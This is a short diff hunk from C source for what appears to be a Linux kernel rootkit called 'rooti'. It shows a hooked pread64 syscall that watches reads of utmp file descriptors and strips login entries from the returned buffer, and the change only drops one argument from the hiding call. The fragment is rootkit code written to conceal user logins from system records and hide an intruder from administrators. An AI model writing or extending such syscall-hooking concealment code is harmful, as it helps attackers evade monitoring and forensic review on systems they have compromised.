@@ -163,7 +163,7 @@ static asmlinkage long hook_pread64(const struct pt_regs *regs) {
     struct rooti_tracked_fd *record;
     list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
         if (pid == record->pid && fd == record->fd) {
-            rooti_hide_login_entry(user_buf, count, ROOTI_HIDE_USER);
+            rooti_hide_login_entry(user_buf, count);
         }
     }
     return nread;
